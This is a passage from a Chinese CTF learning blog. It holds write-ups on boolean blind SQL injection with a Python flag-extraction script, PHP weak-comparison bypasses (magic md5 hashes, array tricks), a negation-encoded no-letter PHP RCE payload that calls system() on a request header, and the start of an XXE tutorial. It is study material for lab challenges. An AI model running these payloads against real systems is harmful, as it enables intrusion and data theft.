</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/01/31/%E5%9F%BA%E4%BA%8E%E8%BF%90%E8%A1%8C%E9%94%99%E8%AF%AF%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">基于运行错误的布尔盲注</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-01-31</time><div class="content"><p>盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。 通过一道题学习一下布尔盲注。</p>
<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>布尔盲注就是通过页面返回的true或false两种不同类型来猜测数据，注入攻击。</p>
<p>当输入cat=1’时显示如图，可以判断存在注入。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBc0420bd95fa2ce1aa7cf46126215f4fd?method=download&shareKey=a82b932092e83d8fce0dbf6d5c2a23b3"></p>
<p>即当不存在过滤内容时，返回cat.png，当存在过滤内容时则返回nono.png。可以判断这是布尔注入。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBeef04c91cadf52f3fb1374b2fc8aa443?method=download&shareKey=5c12eaa62b88ead873c39b0deae41aa5"></p>
<p>先看一下被ban掉的关键字。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">union</span><br><span class="line">*</span><br><span class="line">&#39;</span><br><span class="line">&quot;</span><br><span class="line">substr</span><br><span class="line">mid</span><br><span class="line">&#x3D;</span><br><span class="line">like</span><br><span class="line">into</span><br><span class="line">file</span><br><span class="line">sleep</span><br><span class="line">benchmark</span><br><span class="line">^</span><br><span class="line">or</span><br><span class="line">空格</span><br><span class="line">&amp;</span><br><span class="line">&gt;</span><br><span class="line">&lt;</span><br><span class="line">#</span><br><span class="line">-</span><br><span class="line">ascii</span><br><span class="line">ord</span><br></pre></td></tr></table></figure>

<p>因为之前没有接触过这类，所以并没有思路，以下是在看了gq师兄的writeup后做的。</p>
<h1 id="ST-X和ST-GeomFromText-函数"><a href="#ST-X和ST-GeomFromText-函数" class="headerlink" title="ST_X和ST_GeomFromText 函数"></a>ST_X和ST_GeomFromText 函数</h1><p>这里用到了这两个函数，这都是空间函数，ST_X是返回一个坐标的x坐标，所以需要用Point函数来传入坐标 ，ST_GeomFromText方法即根据字符串表示构造几何，语法为<code>ST_GeomFromText(character-string,srid)</code>，character-string:包含几何文本表示的字符串，输入格式可以是任何支持的文本输入格式，包括标准文本（WKT)或扩展标准文本（EWKT）<br>srid为空间引用标识符。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB81732ceffb5bed751c13743dd724faca?method=download&shareKey=92d5e82ec8f433892546e7f98d39e55f"></p>
<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>前面知道空格被过滤，这里可以用<code>\t</code>来代替，url编码为<code>%09</code>，用IF函数返回值来判断盲注结果，payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat&#x3D;1%09and%09IF(0,ST_X(ST_GeomFromText(&#39;POINT(wing)&#39;)),0)</span><br></pre></td></tr></table></figure>

<p>由于单双引号都被过滤，因而需要将<code>&#39;POINT(wing)&#39;</code>转为16进制</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> var_dump(bin2hex(<span class="string">&quot;POINT(wing)&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">   结果为<span class="number">504</span>f494e542877696e6729</span><br></pre></td></tr></table></figure>

<p>最终payload即为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat&#x3D;1%09and%09IF(0,ST_X(ST_GeomFromText(504f494e542877696e6729)),0)</span><br></pre></td></tr></table></figure>

<p>用gq师兄的脚本跑出flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author：Gqleung</span></span><br><span class="line"><span class="comment">#Email:  admin@plasf.cn</span></span><br><span class="line"><span class="comment">#blog:   http://www.plasf.cn</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord2hex</span>(<span class="params">string</span>):</span></span><br><span class="line">	result = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">		r = hex(ord(i));</span><br><span class="line">		r = r.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">		result = result+r</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span>+result</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://47.98.234.232:28016/index.php?cat=&quot;</span></span><br><span class="line">tables = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-&#125;&#123;&#x27;</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">70</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> tables:</span><br><span class="line">		<span class="keyword">if</span> j ==<span class="string">&quot;&#123;&quot;</span> <span class="keyword">or</span> j==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">			j=<span class="string">&#x27;\\&#x27;</span>+j</span><br><span class="line">		payload = <span class="string">&quot;1	and	IF((select	flag	from	flag)	regexp	binary	%s,	ST_X(ST_GeomFromText(0x504F494E54286D61647329)),	0)&quot;</span>%(ord2hex(<span class="string">&quot;^&quot;</span>+result+j))</span><br><span class="line">		r = requests.get(url+payload);</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;cat&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			result=result+j</span><br><span class="line">			print(result.replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEBd1d7493830bfeea86ba7cce0c2757c09?method=download&shareKey=bd9704c2138822969b6e5ada66192b2c"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题是基于运行错误的布尔盲注，用到了空间函数，这是新的知识点，由于之前一直没有接触sql注入，所以这道题对于我来说是很陌生的，很多sql注入的基础知识点都不懂，即使有writeup依旧是一知半解，可以说这是一篇失败的文章，等学习完sql注入的内容后再补充修改完善。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/01/30/PHP%E4%B8%AD%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/">PHP中的弱类型比较</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-01-30</time><div class="content"><p>之前在许多题目中都有涉及到php中的弱类型比较的知识点，今天就总结一下php中的弱类型比较问题。</p>
<h1 id="“-”与“-”"><a href="#“-”与“-”" class="headerlink" title="“==”与“===”"></a>“==”与“===”</h1><p>之前在学习反序列化的知识时有一道题就涉及到这个，在php中<code>==</code>不比较变量类型，是弱等于，<code>===</code>会比较变量类型，是强等于。</p>
<p><code>==</code>在比较时，会先将字符串转换成数值再进行比较。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> var_dump(<span class="string">&quot;adc&quot;</span>==<span class="number">0</span>); </span><br><span class="line"> var_dump(<span class="string">&quot;1adc&quot;</span>==<span class="number">1</span>); </span><br><span class="line"> var_dump(<span class="string">&quot;abc1&quot;</span>==<span class="number">1</span>);</span><br><span class="line"> var_dump(<span class="string">&quot;abc1&quot;</span>==<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEBf2fc06ff7ecb2b719555d883e71b71c0?method=download&shareKey=2f8c9d117bab1977e6aec6ab096340f6"></p>
<p>如图，abc被强制转换，结果为0，第二个<code>1abc</code>以合法数据开头，则以该数为值。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBff21360922d675fa04b0f281236aba0f?method=download&shareKey=5acc0198d43bf804488cb88815b4e768"></p>
<p><code>===</code>在比较时先比较类型再比较数值。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> var_dump(<span class="number">1</span>===<span class="number">1</span>); </span><br><span class="line"> var_dump(<span class="string">&quot;1&quot;</span>===<span class="number">1</span>); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB2b65dcf45d0405222452683703b0c544?method=download&shareKey=7d5d8fe19790d22fe739bc63cb78e445"></p>
<h1 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h1><h2 id="md5绕过"><a href="#md5绕过" class="headerlink" title="md5绕过"></a>md5绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">&#x27;a&#x27;</span>] != $_POST[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">if</span> (md5($_POST[<span class="string">&#x27;a&#x27;</span>]) == md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    	<span class="keyword">else</span></span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;you are wrong&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;请输入不同的a，b值&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>md5()函数无法处理数组，若传进去为数组则返回null，当我们传进两个数组时即相等绕过。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB10b764d0b72c2d7255b00aad18355f00?method=download&shareKey=a7992f07d1ffabef773b5b00e3be15b6"></p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>md5开头是0e的字符串，而<code>0e</code>开头在3比较的时候会看作科学计数法，无论<code>0e</code>后是什么均为0。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBc8e53fa90bdefafc1d751e4433e8287a?method=download&shareKey=097ec1d41128ec69f9bb68145d958729"></p>
<p>所以只需要输入两个md5加密后是0e开头的字符串即可绕过。这里是部分对照。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br></pre></td></tr></table></figure>

<p>因此选择两个传入即可。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB01d655a837404245e3387afb606fcb93?method=download&shareKey=7cfbb16338d666e4f2d9766909cf0f2a"></p>
<h2 id="switch绕过"><a href="#switch绕过" class="headerlink" title="switch绕过"></a>switch绕过</h2><p>原理同上</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBd3587d9a2ffcfe90d825359d81d27cf8?method=download&shareKey=8e51445e21ae95e5f6d55055f1d990dc"></p>
<h2 id="strcmp-绕过"><a href="#strcmp-绕过" class="headerlink" title="strcmp()绕过"></a>strcmp()绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $password=<span class="string">&quot;***************&quot;</span>;</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strcmp($_POST[<span class="string">&#x27;password&#x27;</span>], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Right!!!&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Wrong&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p> strcmp<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%87%BD%E6%95%B0/301912">函数</a>是string compare(字符串比较)的缩写，用于比较两个字符串并根据比较结果返回整数。基本形式为strcmp(str1,str2)，若str1=str2，则返回零；若str1&lt;str2，则返回负数；若str1&gt;str2，则返回正数。 </p>
</blockquote>
<p>strcmp()是传入字符串类型，若传入数组则错误，但会判断其相等。</p>
<p>payload即为<code>password[]=abc</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB283f6fef26cc7e2abc6665209122eede?method=download&shareKey=1b88163accd2e4f0b51c75d70fef27d7"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/12/23/%E4%B8%A4%E9%81%93web%E7%BB%83%E4%B9%A0/">两道web练习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-12-23</time><div class="content"><p>Gq师兄出的两道web题，记录一下解题过程和知识点。</p>
<h1 id="Guojingming"><a href="#Guojingming" class="headerlink" title="Guojingming"></a>Guojingming</h1><p>题目源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code) &gt; <span class="number">70</span> <span class="keyword">or</span> preg_match(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Your Guojingming&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>($code);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>这里有两个正则匹配，用脚本跑出可用字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allow = [];</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">255</span>; $i++)&#123;</span><br><span class="line">    $string =chr($i);</span><br><span class="line">    <span class="keyword">if</span> ( !preg_match(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>, $string))&#123;</span><br><span class="line">        $allow[$i]=$string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r($allow);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB02cfcc5f4817a8fa5637b341680fd753?method=download&shareKey=71a43cae6a9626174d755814c7722c2f"></p>
<p>这里由于<code>^</code>被过滤，只能用<code>~</code>取反,参考之前写的无字符构造payload</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://zyangtong.github.io/2020/11/30/%E6%97%A0%E5%AD%97%E7%AC%A6webshell/">https://zyangtong.github.io/2020/11/30/%E6%97%A0%E5%AD%97%E7%AC%A6webshell/</a></p>
</blockquote>
<p>而第二个正则匹配不能出现参数，否则无法替换成空，涉及无参数rce</p>
<blockquote>
</blockquote>
<p>通过getallheaders()来读flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(system(end(getallheaders())));</span><br></pre></td></tr></table></figure>

<p>Gq师兄给的 hint ：<code>[&#39;phpinfo&#39;][false]</code>可以构建字符串<code>phpinfo</code></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBdb7a2b034925d6b337883e6cfe56d674?method=download&shareKey=7a41200321bb45a470eaeee18f4cedff"></p>
<p>所以这道题就是先将函数取反，然后通过<code>[&#39;phpinfo&#39;][false]</code>这种形式嵌套在一起</p>
<p>取反脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; urlencode(~&#39;&#39;);</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>分别取反构造<code>system(end(getallheaders()));</code></p>
<p>最终payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</span><br></pre></td></tr></table></figure>

<p>用bp抓包在最后请求头添加cat /flag,读到flag</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB8f9ea30a11a017442bb6e1198ef61b1b?method=download&shareKey=64968a1ee84e28d0cc658df4a7e0f42a"></p>
<p>这道题考察了无字符的取反，无参数rce和动态函数构造。</p>
<h1 id="easyphp20201216"><a href="#easyphp20201216" class="headerlink" title="easyphp20201216"></a>easyphp20201216</h1><p>题目源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$a = create_function(<span class="string">&quot;&quot;</span>, <span class="string">&quot;echo(`cat /flag`);&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">     $_GET[<span class="string">&#x27;a&#x27;</span>]();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>这里出现一个新的函数<code>create_function</code></p>
<blockquote>
<p> create_function()主要用来创建匿名函数 </p>
</blockquote>
<p>官方案例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$newfunc = create_function(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;New anonymous function: <span class="subst">$newfunc</span>\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $newfunc(<span class="number">2</span>, M_E) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">// outputs</span></span><br><span class="line"><span class="comment">// New anonymous function: lambda_1</span></span><br><span class="line"><span class="comment">// ln(2) + ln(2.718281828459) = 1.6931471805599</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB56a3e530018ecd9c95aa96f8debcd167?method=download&shareKey=3aa4f71c54f4cebc08b3b719d5d5e2ae"></p>
<p>也就是说等价于下面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda_1</span>(<span class="params">$a,$b</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ln(<span class="subst">$a</span>) + ln(<span class="subst">$b</span>) = &quot;</span> . log($a * $b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果直接输出$a如图，会自动生成一个%00lambda_%d</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB6a3a9d63019f805fda785068a5c3b028?method=download&shareKey=7f624798f27daa28cf86a6b5841a8023"></p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.98.234.232:28018&#x2F;?a&#x3D;%00lambda_1</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB994de6bb355cf2832d572435648487eb?method=download&shareKey=fa8ce2f7a5bbeed422dc20f758ef24b0"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/12/22/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">XXE漏洞学习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-12-22</time><div class="content"><p>XXE（XML External Entity），也就是xml外部实体注入 。之前海啸杯有一道题涉及到这个点。</p>
<h1 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h1><p>想学习xxe就得先弄明白什么是xml( 可扩展标记语言 )</p>
<blockquote>
<p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p>
</blockquote>
<p>这是在网上找的一张图，途中包括了xml三个内容<code>XML声明</code>、<code>DTD文档类型定义</code>、<code>文档元素</code>。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB4ea14ba19a67f70242eb4da53a4f1a73?method=download&shareKey=c7077e479882aae14cde2c6c54e4fcf5"></p>
<h2 id="XML声明"><a href="#XML声明" class="headerlink" title="XML声明"></a>XML声明</h2><p>这是最简单的xml声明，version属性是必须的，还有 encoding 属性和 standalone 属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="DTD文档类型定义"><a href="#DTD文档类型定义" class="headerlink" title="DTD文档类型定义"></a>DTD文档类型定义</h2><p> DTD的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。 </p>
<h3 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h3><p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>

<p>例如这样就是内部声明</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<h3 id="外部声明DTD"><a href="#外部声明DTD" class="headerlink" title="外部声明DTD"></a>外部声明DTD</h3><p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>例如这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>然后note.dtd就是</p>
